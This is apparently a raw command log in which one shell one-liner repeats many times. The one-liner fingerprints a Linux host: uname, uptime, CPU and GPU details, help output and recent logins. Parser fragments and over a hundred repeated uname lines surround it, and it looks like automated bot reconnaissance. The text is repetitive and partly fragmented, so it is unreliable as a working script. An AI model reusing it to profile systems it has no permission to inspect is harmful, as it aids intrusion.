cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname -s -m
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -m
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
